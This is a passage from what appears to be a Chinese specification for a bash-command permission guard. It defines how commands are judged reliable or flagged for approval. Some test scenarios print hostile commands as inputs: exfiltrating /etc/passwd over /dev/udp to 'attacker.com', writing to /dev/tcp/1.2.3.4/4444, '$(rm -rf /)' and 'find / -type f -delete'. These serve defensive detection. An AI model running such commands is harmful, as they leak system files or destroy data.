- `$$` —— 当前 shell 进程的 PID（纯数字）

**理由**：这四个变量展开后是纯数字（或 PID），不可能携带文件路径，不会改变命令实际访问的目录 / 文件集。之前把它们当作 `special:*` 判不可靠会导致大量开发场景命令被误弹窗（如 `git status && echo "cached_exit=$?"`——本仓库自己频繁使用）。

**对比组（仍判不可靠）**：以下 shell 特殊参数可能携带路径（位置参数可以是任意文件名），MUST 保持原有 `special:*` 判不可靠行为：

- `$@`、`$*` —— 全部位置参数（展开后可以是任意路径列表）
- `$-` —— shell 标志字符（可能包含 `-n` 之类影响命令行为的选项）
- `$0`..`$9` —— 具体位置参数（`$0` 是脚本名、`$1`..`$9` 是位置参数，都可能是路径）

#### Scenario: `$?` 作为 exit status 不判不可靠

- **WHEN** bash 命令为 `echo "cached_exit=$?"`
- **THEN** 提取结果 `reliable: true`，不再被标记为 `unresolved variable: special:?`

#### Scenario: git status 真实场景回归

- **WHEN** bash 命令为 `git status --short && git diff --cached --quiet; echo "cached_exit=$?"`
- **THEN** 提取结果 `reliable: true`——`$?` 在 `INERT_SPECIAL_PARAMS` 白名单内，不作为 unresolved 上报；其余命令（`git status`、`git diff`）都不在写目标命令表，不提取任何 target

#### Scenario: `$!` / `$#` / `$$` 同属无路径影响

- **WHEN** bash 命令为 `pid=$!; echo pid`（或 `count=$#` / `pid=$$`）
- **THEN** 提取结果 `reliable: true`——三个变量都在白名单内

#### Scenario: `$@` 仍判不可靠

- **WHEN** bash 命令为 `cat $@`
- **THEN** 提取结果为 `{ reliable: false, reason: "unresolved variable: special:@" }`——`$@` 不在白名单，仍可能被展开为任意路径列表

#### Scenario: 位置参数 `$0` / `$1` 仍判不可靠

- **WHEN** bash 命令为 `cat $0`（或 `cat $1`）
- **THEN** 提取结果 `reliable: false`，reason 为 `unresolved variable: special:0` / `unresolved variable: special:1`——位置参数可以是任意文件路径

#### Scenario: `$-` shell 标志仍判不可靠

- **WHEN** bash 命令为 `echo $-`
- **THEN** 提取结果 `reliable: false`，reason 为 `unresolved variable: special:-`——shell 标志可能包含影响行为的选项

#### Scenario: `$?` 在单引号内作为字面字符

- **WHEN** bash 命令为 `echo 'cached_exit=$?'`
- **THEN** 提取结果 `reliable: true`——单引号内的 `$` 是字面字符，不触发变量检测（与已有引号感知语义一致）

### Requirement: 有界 glob 免不可靠标记

当未加引号的 glob 通配符（`*`、`?`、`[`）满足以下全部条件时，MUST NOT 触发"不可靠"标记（即不再因 glob_expansion 走 tier=two 弹窗），而是交给后续正常提取流程按 read/write target 处理：

1. 该 glob 元字符出现在**引号外且未被反斜杠转义**的位置（遵循现有引号感知规则）
2. glob 元字符前的路径前缀（从命令起始到 glob 元字符之前的路径片段）MUST 完全位于 `<projectRoot>` 内部（不含 `../` 越界）
3. glob 所在的 pipeline stage 的首命令（command name）**及其参数** MUST 共同构成"只读"命令。判定采用**析取式**：满足以下任一条件即判为只读——
   - **条件 3a**：命令名属于 READ_ONLY_COMMANDS（`cat`/`head`/`tail`/`wc`/`grep`/`ls`/`tree`/`stat`/`du`/`df`/`file`/`less`/`more`/`git log` 等）——命令名属于集合即视为只读，不看参数
   - **条件 3b**：命令名为 `find` 且通过"find 的参数条件性只读判定"（见下方"find 的参数条件性只读判定"节）
   - **条件 3c**：命令名为 `for` 且该 stage 是一个结构完整的 for 循环（`for VAR in WORDS; do BODY; done`）且迭代集 WORDS 中包含至少一个未加引号的 glob 元字符且 BODY 通过"for 循环体只读判定"（见下方"for 循环体只读判定"节）——**本 change 新增**
   - 命令名既不属于 READ_ONLY_COMMANDS、也不是 `find`、也不满足条件 3c 的 `for` 时，条件 3 不满足

**find 的参数条件性只读判定**：当命令名为 `find` 时，MUST 检查其所有参数——若任一参数是以下写操作标志之一，MUST NOT 判为只读（glob 判定条件 3 不满足）：

- `-delete`（就地删除匹配文件）
- `-exec`（对匹配文件执行任意命令）
- `-execdir`（在匹配文件所在目录执行任意命令）
- `-ok`（交互式对匹配文件执行任意命令）
- `-okdir`（交互式在匹配文件所在目录执行任意命令）

`find` 的其他参数（`-name`/`-type`/`-size`/`-mtime`/`-user`/`-group`/`-newer`/`-newermt`/`-maxdepth`/`-mindepth` 等 100+ 个过滤条件）MUST 视为不改变 `find` 的只读性质。

**for 循环体只读判定**：当命令名为 `for` 且条件 3c 的前置（结构完整 + 迭代集含 glob）满足时，MUST 检查该 for 循环的 BODY 是否只读。BODY 的只读判定复用"字面量 for 循环豁免"requirement 中的 BODY 只读规则——BODY 里的每条命令都必须是 read-only（READ_ONLY_COMMANDS 集合、SILENT_COMMANDS、HARMLESS_BUILTINS，或 `find` 且通过 find 的参数条件性只读判定）。

**理由**：`for` 循环的迭代集 glob（如 `for d in openspec/specs/*/; do ls "$d"; done`）在实际文件访问上等价于 shell 展开后的 `ls openspec/specs/1/ openspec/specs/2/ ...`——展开的目标集合完全位于项目内（因为 glob 前缀被条件 2 限定在项目内），且循环体只做 read-only 操作（通过条件 3c 的 BODY 只读判定）。原实现把 `for` 当作"不在 READ_ONLY_COMMANDS"的普通命令处理，导致迭代集内的 glob 被 `scanUnreliable` 提前触发 `glob_expansion`，永远走不到 `scanControlFlow` 的字面量 for 循环豁免。本条件 3c 直接在 `isBoundedGlobSafe` 层面处理该情形，避免 `scanUnreliable` 与 `scanControlFlow` 的短路冲突。

**边界**：
- 条件 3c 只在迭代集**含 glob** 时适用；不含 glob 的字面量 for 循环（如 `for i in a b c`）走"字面量 for 循环豁免"requirement
- BODY 内 glob 的判定不在本条件 3c 范围内——BODY 内的 glob 仍走常规 bounded-glob 判定，因为 BODY 内的 glob 前缀通常含 `$VAR`（`"$d"/*.md`），其前缀无法静态解析到具体路径，仍判 `glob_expansion`。这是与"字面量 for 循环豁免"requirement 保持一致的保守判定
- for 循环结构不完整（无 `do`、无 `; done`）时，条件 3c 不满足

**反例（仍触发 glob_expansion）**：
- glob 前缀出界（如 `for d in ../other/*; do ls "$d"; done`、`for d in /tmp/*; do cat "$d"; done`）
- BODY 含写操作（如 `for d in openspec/*/; do rm "$d"; done`）
- BODY 含非只读命令（如 `for d in openspec/*/; do curl "$d"; done`）
- for 循环结构不完整（如 `for d in openspec/*/; do ls "$d"` 无 `; done`）
- 迭代集全字面量（如 `for i in a b c; do echo "$i"; done`）——本条件不适用，走"字面量 for 循环豁免"requirement
- `find` 含写操作参数（如 `find src/ -name "*.bak" -delete`、`find . -name "*.log" -exec rm {} \;`）

**命令片段上下文**：条件 3 中的"pipeline stage 的首命令及其参数"按以下方式确定——先把整条命令按"命令分隔符"（见"管道按 stage 独立提取"requirement）拆为多个**命令片段**，再把每个命令片段按顶层 `|` 拆为多个 pipeline stage；条件 3 判定的是"包含该 glob 的那个 pipeline stage 的首命令及其参数"，属于哪个命令片段不影响其他片段。

#### Scenario: 项目内 ls glob 自动放行

- **WHEN** bash 命令为 `ls openspec/changes/archive/*/`，projectRoot 为 `/Users/eliot/my/@permission-guard/pi`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /Users/eliot/my/@permission-guard/pi/openspec/changes/archive/] }`（按前缀目录读处理），不触发 glob_expansion

#### Scenario: 项目内 cat glob 自动放行

- **WHEN** bash 命令为 `cat openspec/specs/*/spec.md`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true, targets: [read /Users/eliot/my/@permission-guard/pi/openspec/specs/] }`，不触发 glob_expansion

#### Scenario: `find . -name "*.ts"` 自动放行

- **WHEN** bash 命令为 `find src/ -name "*.ts"`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/] }`——`find` 参数不含写操作 flag，条件 3 满足

#### Scenario: `find /etc -type f` 自动放行

- **WHEN** bash 命令为 `find /etc -type f`，projectRoot 内（若 projectRoot 覆盖 `/etc`，或 `/etc` 是 project 内路径）
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc] }`——`-type f` 是过滤条件，不含写操作 flag

#### Scenario: `find -delete` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.bak" -delete`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-delete` 是写操作 flag，条件 3 不满足

#### Scenario: `find -exec` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.tmp" -exec rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-exec` 是写操作 flag

#### Scenario: `find -execdir` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.log" -execdir cat {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-execdir` 是写操作 flag

#### Scenario: `find -ok` 在 glob 上下文触发 glob_expansion

- **WHEN** bash 命令为 `find src/ -name "*.tmp" -ok rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`-ok` 是写操作 flag

#### Scenario: 写命令内的 glob 仍触发 glob_expansion

- **WHEN** bash 命令为 `rm -rf /tmp/build/*.log`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`rm` 不在 read-only 命令集合

#### Scenario: 跨项目边界的 glob 仍触发 glob_expansion

- **WHEN** bash 命令为 `ls ../other-project/*/`，projectRoot 为 `/proj`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——前缀 `../other-project/` 出界

#### Scenario: git log 带路径 glob 自动放行

- **WHEN** bash 命令为 `git log --oneline openspec/specs/*/spec.md`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /Users/eliot/my/@permission-guard/pi/openspec/specs/] }`，不触发 glob_expansion

#### Scenario: `;` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `echo hi; wc -l src/*.ts`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`，不触发 glob_expansion——`echo hi` 片段与 `wc -l src/*.ts` 片段独立判定，后者满足 read-only + 项目内前缀即放行

#### Scenario: `&&` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `false && cat src/*.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`——`false` 片段 0 target，`cat` 片段满足 read-only + 项目内前缀

#### Scenario: `||` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `true || wc -l test/*.test.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/test/*.test.ts] }`——`||` 两侧片段独立判定

#### Scenario: `&` 分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `sleep 5 & wc -l src/*.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`——`&` 作为命令分隔符，`sleep` 片段 0 target，`wc` 片段满足 read-only + 项目内前缀

#### Scenario: 换行分隔的多命令中每片段独立判定

- **WHEN** bash 命令为 `echo hi\nwc -l src/*.ts`（`\n` 为实际换行符）
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts] }`——换行作为命令分隔符，两个片段独立判定

#### Scenario: 写命令 glob 即使作为片段也不放行

- **WHEN** bash 命令为 `echo hi; rm -rf src/*.bak`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——`rm` 片段含未加引号的 glob 且不在 read-only 集合，即使 `echo` 片段本身无害也不放行

#### Scenario: 多片段混排且每片段均满足条件

- **WHEN** bash 命令为 `echo hi; wc -l src/*.ts; wc -l test/*.test.ts`
- **THEN** 提取结果为 `{ reliable: true, targets: [read <projectRoot>/src/*.ts, read <projectRoot>/test/*.test.ts] }`——每个含 glob 的片段独立判定满足条件

#### Scenario: for 循环迭代集 glob + read-only body 自动放行

- **WHEN** bash 命令为 `for d in openspec/specs/*/; do ls "$d"; done`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`——迭代集 glob 前缀 `openspec/specs/` 在项目内（条件 2 满足），`for` 循环体 `ls "$d"` 是 read-only（条件 3c 满足），不触发 glob_expansion

#### Scenario: for 循环迭代集 glob 前缀出界仍触发 glob_expansion

- **WHEN** bash 命令为 `for d in /etc/*/; do ls "$d"; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——迭代集 glob 前缀 `/etc/` 在 projectRoot 之外，条件 2 不满足

#### Scenario: for 循环迭代集 glob + write body 仍触发 glob_expansion

- **WHEN** bash 命令为 `for d in openspec/specs/*/; do rm "$d"; done`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——循环体 `rm "$d"` 是写操作，条件 3c 不满足

#### Scenario: for 循环迭代集 glob + cat body 自动放行

- **WHEN** bash 命令为 `for d in openspec/specs/*/; do cat "$d"; done`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`——循环体 `cat "$d"` 是 read-only，条件 3c 满足

#### Scenario: for 循环迭代集 glob + echo body 自动放行

- **WHEN** bash 命令为 `for d in openspec/specs/*/; do echo "$d"; done`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`——循环体 `echo "$d"` 是 HARMLESS_BUILTINS，条件 3c 满足

#### Scenario: for 循环迭代集 glob + 多命令只读 body 自动放行

- **WHEN** bash 命令为 `for f in openspec/changes/archive/*/; do echo "=== $f ==="; grep -n "^## " "$f"; done`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`——循环体两条命令 `echo` 与 `grep -n "^## "` 都是 read-only/HARMLESS，条件 3c 满足

#### Scenario: for 循环迭代集 glob + body 含 glob 仍触发 glob_expansion

- **WHEN** bash 命令为 `for d in openspec/specs/*/; do ls "$d"/*.md; done`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——BODY 内的 glob（`"$d"/*.md`）前缀含 `$d` 无法静态解析，仍判 glob_expansion

#### Scenario: for 循环结构不完整仍触发 glob_expansion

- **WHEN** bash 命令为 `for d in openspec/specs/*/; do ls "$d"`（无 `; done`）
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——for 循环结构不完整，条件 3c 不满足

#### Scenario: for 循环迭代集全字面量走另一条路径

- **WHEN** bash 命令为 `for i in a b c; do echo "$i"; done`，projectRoot 内
- **THEN** 本条件 3c 不适用（迭代集不含 glob）；此命令走"字面量 for 循环豁免"requirement 的判定路径，与 bounded-glob 判定无关

### Requirement: 设备重定向不计入写目标

当重定向操作符（`>`、`>>`、`2>`、`2>>`、`>&`）的目标路径以 `/dev/` 开头时，MUST NOT 将其作为 write target 加入提取结果。**例外**：以下子路径 MUST NOT 被豁免——它们是可以外传数据或访问任意文件的实际 IO 目标，MUST 作为 write target 加入提取结果（走正常决策路径）：

- `/dev/tcp/...`（bash 网络套接字，形如 `/dev/tcp/HOST/PORT`）
- `/dev/udp/...`（bash UDP 套接字，形如 `/dev/udp/HOST/PORT`）
- `/dev/fd/[0-9]+`（fd 数字文件描述符，如 `/dev/fd/3`；`/dev/fd` 本身、`/dev/fd/` 后非数字路径如 `/dev/fd/stdin` 保持豁免）

这类路径（`/dev/null`、`/dev/zero`、`/dev/stderr`、`/dev/stdout`、`/dev/fd` 目录本身、`/dev/stdin` 等非网络套接字/非数字 fd 的 `/dev/*` 目标）在 shell 用户语境中固定用于"丢弃输出"或"转向标准流"，不构成用户可见的文件系统写入副作用。

**理由**：`/dev/*` 一刀切豁免会让 `/dev/tcp`、`/dev/udp`（bash 内置的 TCP/UDP 网络套接字）被误判为无副作用——实际这两类路径允许把任意数据外传到任意网络主机。`/dev/fd/N`（`N` 为数字）是任意文件描述符的文件别名，可以指向任意打开的文件。这三类都需要走正常决策路径，用户可见副作用才能被拦截。其他 `/dev/*` 路径保持豁免，避免合法静默丢弃模式（`2>/dev/null`、`>/dev/stderr`）被误伤。

**边界**：
- `/dev/stdin`、`/dev/stdout`、`/dev/stderr`（标准流别名）保持豁免
- `/dev/null`、`/dev/zero`、`/dev/random`、`/dev/urandom` 保持豁免
- `/dev/fd`（目录本身）和 `/dev/fd/stdin`、`/dev/fd/stdout`、`/dev/fd/stderr`（fd 目录下的标准流别名，不是纯数字）保持豁免
- `/dev/fd/[0-9]+`（数字 fd）不豁免

#### Scenario: `/dev/tcp` 重定向不作豁免

- **WHEN** bash 命令为 `echo pwn > /dev/tcp/1.2.3.4/4444`
- **THEN** 提取结果为 `{ reliable: true }`，包含 write target `/dev/tcp/1.2.3.4/4444`——网络套接字不作 `/dev/*` 豁免

#### Scenario: `/dev/udp` 重定向不作豁免

- **WHEN** bash 命令为 `cat /etc/passwd > /dev/udp/attacker.com/53`
- **THEN** 提取结果为 `{ reliable: true }`，包含 write target `/dev/udp/attacker.com/53`——UDP 套接字不作 `/dev/*` 豁免

#### Scenario: `/dev/fd/N` 数字 fd 重定向不作豁免

- **WHEN** bash 命令为 `echo x > /dev/fd/3`
- **THEN** 提取结果为 `{ reliable: true }`，包含 write target `/dev/fd/3`——数字 fd 不作豁免

#### Scenario: stderr 重定向到 /dev/null 不触发写目标

- **WHEN** bash 命令为 `cat /etc/passwd 2>/dev/null`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc/passwd] }`，不含 write target

#### Scenario: stdout 重定向到 /dev/null 不触发写目标

- **WHEN** bash 命令为 `echo "hello" >/dev/null`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`，不含 write target

#### Scenario: 混合重定向中仅 /dev/ 目标被过滤

- **WHEN** bash 命令为 `ls /tmp >/dev/null 2>/tmp/error.log`
- **THEN** 提取结果包含 read target `/tmp` 和 write target `/tmp/error.log`，`>/dev/null` 被过滤

#### Scenario: 重定向到 /dev/stderr / /dev/stdout 不触发写目标

- **WHEN** bash 命令为 `echo "error" >&2` 或 `echo "out" >/dev/stdout`
- **THEN** 提取结果不含 write target（`/dev/stderr`、`/dev/stdout` 同为 `/dev/` 前缀）

#### Scenario: 重定向到普通文件仍正常提取

- **WHEN** bash 命令为 `echo "hello" >/tmp/out.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [write /tmp/out.txt] }`——普通文件不受影响

#### Scenario: `/dev/fd/stdin` 保持豁免

- **WHEN** bash 命令为 `echo x > /dev/fd/stdin`
- **THEN** 提取结果不含 write target——`/dev/fd/stdin` 不是数字 fd，保持豁免

#### Scenario: `/dev/ptmx` 保持豁免

- **WHEN** bash 命令为 `echo x > /dev/ptmx`
- **THEN** 提取结果不含 write target——`/dev/ptmx` 非网络套接字且非数字 fd，保持豁免

### Requirement: 引号定界 heredoc 内容处理

当 bash 命令中出现 heredoc 操作符 `<<` 且其定界符以**引号**包裹（单引号 `'DELIM'`、双引号 `"DELIM"`）或带 dash 形式（`<<-'DELIM'`、`<<-"DELIM"`、`<<-DELIM` 中 DELIM 带引号）时，该 heredoc 的**内容** MUST 视为字面数据——不触发 `heredoc` 不可靠标记，不对内容做任何 `$` / 反引号 / `$(...)` / glob 检测。

**理由**：bash 语义下，引号定界的 heredoc 定界符表示内容**不做任何展开**——`$HOME`、`` `cmd` ``、`$(cmd)` 在引号定界 heredoc 内全是字面字符，等价于单引号字符串。当前 `scanUnreliable` 看到 `<<` 就返回 `"heredoc"`，不区分定界符是否引号包裹，导致 `node --input-type=module <<'EOF' ... EOF`（内联测试脚本）等安全场景被误判为不可靠。

**识别规则**：
1. `scanUnreliable` 遇到 `<<` 时，MUST 检查 `<<` 后（跳过可选的 `-`）是否紧跟 `'` 或 `"`
2. 若紧跟引号 → 读取引号内的定界符 `DELIM`，然后跳过从 `<<` 行结束到**以 DELIM 为唯一内容的行**之间的所有字符（heredoc 内容），继续扫描 heredoc 之后的命令
3. 若 `<<` 后无引号（未引号定界 heredoc，如 `<<EOF`）→ 保持原行为，返回 `"heredoc"` 不可靠标记（内容会展开 `$` / 反引号）

**dash 形式**（`<<-`）：`<<-` 后跟引号定界符时同样适用本规则。dash 形式的结束定界符行首允许前导空白（bash `<<-` 会去除前导 tab），本规则在匹配结束定界符行时 MUST 容忍前导 tab/空白。

**内容跳过的边界**：内容跳过 MUST 精确到结束定界符行——若找不到结束定界符（heredoc 未闭合），MUST 回退到原 `return "heredoc"` 行为（保守判不可靠）。

#### Scenario: 单引号定界 heredoc reliable

- **WHEN** bash 命令为 `cat <<'EOF'\nhello\nEOF`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——heredoc 内容 `hello` 视为字面数据，不触发 heredoc 不可靠标记

#### Scenario: 双引号定界 heredoc reliable

- **WHEN** bash 命令为 `cat <<"EOF"\nhello\nEOF`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——双引号定界同样不做展开

#### Scenario: dash + 引号定界 heredoc reliable

- **WHEN** bash 命令为 `cat <<-'EOF'\nhello\nEOF`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——dash 形式 + 引号定界同样 reliable

#### Scenario: 引号定界 heredoc 内含 `$` 与反引号 reliable

- **WHEN** bash 命令为 `cat <<'EOF'\n$(rm -rf /)\n\`whoami\`\nEOF`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——引号定界 heredoc 内的 `$()` 与反引号全是字面字符，不触发不可靠

#### Scenario: 未引号定界 heredoc 仍 unreliable

- **WHEN** bash 命令为 `cat <<EOF\nhello\nEOF`
- **THEN** 提取结果为 `{ reliable: false, reason: "heredoc" }`——未引号定界 heredoc 内容会展开 `$` / 反引号，仍判不可靠

#### Scenario: 引号定界 heredoc 前命令正常提取

- **WHEN** bash 命令为 `cat /etc/passwd; cat <<'EOF'\nx\nEOF`
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc/passwd] }`——heredoc 内容跳过，heredoc 前的 `cat /etc/passwd` 正常提取

#### Scenario: 未闭合引号定界 heredoc 回退不可靠

- **WHEN** bash 命令为 `cat <<'EOF'\nhello`（无结束 `EOF` 行）
- **THEN** 提取结果为 `{ reliable: false, reason: "heredoc" }`——找不到结束定界符，保守回退到原 heredoc 不可靠行为

### Requirement: 字面量 for 循环豁免

当 `for` 关键字作为**引号外独立 token**出现时，若满足以下全部条件，MUST NOT 触发 `control_flow` 不可靠标记，改为按循环体命令对每个迭代词提取 read targets：

1. **字面量迭代集**：`for X in <words>` 中的 `<words>` MUST 全部是字面量词（不含 `$` / 反引号 / `$(...)` / 未加引号的 glob 元字符 `*`/`?`/`[`）。引号包裹的词（如 `"a b"`）允许（引号内字面量）
2. **可静态判定的循环体**：`do ... done` 内的命令 MUST 满足：
   - 每个命令的首命令名属于 READ_ONLY_COMMANDS（`cat`/`head`/`tail`/`wc`/`grep`/`find`/`ls`/`tree`/`stat`/`du`/`df`/`file`/`less`/`more`/`git log` 等）或属于 SILENT_COMMANDS（`git`/`npm`/`npx` 等）
   - 循环变量（如 `$f`）MUST 视为已解析的"迭代集字面量之一"——不触发 `unresolved variable`，因为它的值域已被条件 1 静态确定为字面量词集合
   - 体内 MUST NOT 含未引号 glob、命令替换 `$(...)` / 反引号、子 shell `(...)`、process substitution `<(...)`、heredoc（引号定界或未引号均判不可靠，因为 for 体内的 heredoc 边界与循环边界交互复杂）
   - 体内 MUST NOT 含其他控制流关键字（`while`/`if`/`case` 等嵌套控制流）
3. **无重定向到循环变量**：循环体内的重定向目标 MUST NOT 是循环变量（如 `cat > "$f"` 是 write，不满足 read-only 体条件）

**理由**：当 `for` 的迭代集是静态字面量词、循环体是 read-only 命令且循环变量只作为路径参数使用时，实际访问的文件集是"迭代集 × 体的 read targets"的笛卡尔积，静态可确定。与 `while`/`until`（迭代条件运行时决定）本质不同。

**反例（仍触发 control_flow）**：
- 迭代集含 `$` / 反引号 / `$(...)`（如 `for f in $FILES`）
- 迭代集含未引号 glob（如 `for f in /etc/*.conf`）
- 循环体含 write 命令（如 `for f in a b; do rm "$f"; done`）
- 循环体含命令替换（如 `for f in a; do cat $(cmd); done`）
- 嵌套控制流（如 `for f in a; do while ...; done; done`）

**其他控制流关键字不受豁免**：`while`/`until`/`do`/`done`/`if`/`then`/`else`/`elif`/`fi`/`case`/`in`/`esac` MUST 维持原 `control_flow` 判定，不适用本豁免。

#### Scenario: 字面量 for + read-only 体 reliable

- **WHEN** bash 命令为 `for f in a b c; do grep "$f"; done`
- **THEN** 提取结果为 `{ reliable: true, targets: [read a, read b, read c] }`——迭代集全字面量，体含 read-only `grep`，循环变量 `$f` 视为已解析

#### Scenario: 字面量 for + 多命令体 reliable

- **WHEN** bash 命令为 `for f in a b; do echo "$f"; grep "$f"; done`
- **THEN** 提取结果为 `{ reliable: true, targets: [read a, read b] }`——`echo` 0 target，`grep` 提取 read target

#### Scenario: for 迭代集含 glob 仍 unreliable

- **WHEN** bash 命令为 `for f in /etc/*.conf; do cat "$f"; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`——迭代集含未引号 glob，不满足字面量迭代条件

#### Scenario: for 迭代集含变量仍 unreliable

- **WHEN** bash 命令为 `for f in $FILES; do cat "$f"; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`——迭代集含 `$FILES`，不满足字面量迭代条件；`for` 豁免不适用，回退到原 control_flow 判定

#### Scenario: for 体含 write 命令仍 unreliable

- **WHEN** bash 命令为 `for f in a b; do rm "$f"; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`——体含 write 命令 `rm`，不满足 read-only 体条件

#### Scenario: while 循环仍 unreliable（不受豁免）

- **WHEN** bash 命令为 `while read x; do cat "$x"; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`——`while` 不受 `for` 豁免影响

#### Scenario: if 语句仍 unreliable（不受豁免）

- **WHEN** bash 命令为 `if true; then cat /etc/passwd; fi`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`——`if` 不受 `for` 豁免影响

### Requirement: find 写操作 flag 不可靠

当 bash 命令的**任一 command fragment 的首命令**是 `find`（引号外独立 token，命令分隔符 `;`/`&&`/`||`/`&`/`\n` 拆分后的片段首命令）且其参数含以下写操作 flag 之一时，MUST 判 `reliable: false, reason: "find_write_flag"`：

- `-delete`（就地删除匹配文件）
- `-exec`（对匹配文件执行任意命令）
- `-execdir`（在匹配文件所在目录执行任意命令）
- `-ok`（交互式对匹配文件执行任意命令）
- `-okdir`（交互式在匹配文件所在目录执行任意命令）

**判定位置**：本判定在 `extractBashTargets` 主流程的 scan 阶段执行——在 `scanControlFlow`（控制流关键字守卫）之后、`isShellForwarder`（shell 转发器守卫）之前。这保证 isolated `find -delete`（不经 glob、不经 forwarder）也能被检出。

**与其他判定的交互**：
- 若 `find` 参数含写操作 flag 且命令同时含未引号 glob，`glob_expansion` reason 与 `find_write_flag` reason 都可能触发——扫描顺序决定最终 reason，不影响"判 unreliable"的结论。
- 若 `find` 参数含写操作 flag 且 `find` 处于 pipeline 上游，`find_write_flag` 优先于 `forwarding_command`——因为 `find_write_flag` 在 scan 阶段触发，早于 `extractBashTargets` 主流程的 forwarder 检查。

**引号感知**：`find` 的 flag 判定遵循既有引号语义——单引号、双引号、反斜杠转义内的 `-delete` 等字样 MUST 视为字面量，不触发本判定。

**理由**：`find -delete`、`find -exec`、`find -execdir`、`find -ok`、`find -okdir` 是真实的写/删操作。原实现把 `find` 无条件当作 read-only 命令处理（`COMMAND_TABLE.find = readExtract`），导致 `find / -type f -delete` isolated 判为 `{ reliable: true, targets: [read "/"] }` 静默通过。新增独立判定（而非仅依赖 `isBoundedGlobSafe` 的 glob 上下文判定、或 `isForwarderStageSafe` 的 forwarder upstream 判定）覆盖 isolated 场景。

#### Scenario: `find -delete` isolated 判不可靠

- **WHEN** bash 命令为 `find / -type f -delete`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -exec` isolated 判不可靠

- **WHEN** bash 命令为 `find . -exec rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -execdir` isolated 判不可靠

- **WHEN** bash 命令为 `find . -name "*.tmp" -execdir rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -ok` isolated 判不可靠

- **WHEN** bash 命令为 `find . -name "*.tmp" -ok rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -okdir` isolated 判不可靠

- **WHEN** bash 命令为 `find . -name "*.tmp" -okdir rm {} \;`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`

#### Scenario: `find -name` isolated reliable

- **WHEN** bash 命令为 `find . -name "*.ts"`
- **THEN** 提取结果 `reliable: true`——无写操作 flag，走原 readExtract（具体 targets 由 readExtract 决定）

#### Scenario: `find -type f` isolated reliable

- **WHEN** bash 命令为 `find /etc -type f`
- **THEN** 提取结果 `reliable: true`——无写操作 flag

#### Scenario: `find -newermt` 判 reliable（过滤条件）

- **WHEN** bash 命令为 `find . -newermt "2024-01-01"`
- **THEN** 提取结果为 `{ reliable: true }`——`-newermt` 是过滤条件不是写操作 flag

#### Scenario: 单引号内 `-delete` 字面量不触发

- **WHEN** bash 命令为 `find . -name "-delete"`
- **THEN** 提取结果为 `{ reliable: true }`——单引号内 `-delete` 是字面字符串参数，不触发本判定

#### Scenario: 双引号内 `-exec` 字面量不触发

- **WHEN** bash 命令为 `find . -name "-exec"`
- **THEN** 提取结果为 `{ reliable: true }`——双引号内 `-exec` 是字面字符串参数

#### Scenario: `find` 与其他命令序列中一处含 write flag 判不可靠

- **WHEN** bash 命令为 `echo hi; find . -delete; ls /tmp`
- **THEN** 提取结果为 `{ reliable: false, reason: "find_write_flag" }`——序列中任一 fragment 首命令是 `find` 且含写操作 flag 即触发

### Requirement: Git 只读子命令的 blob 语法与 repo 内路径静默放行

系统 SHALL 在 `SILENT_COMMANDS` 的 `git` allow-set 内的**只读子命令**后续接受 git blob 语法与 repo 内相对路径作为 positional 参数，并判静默放行（`{ reliable: true, targets: [] }`）。

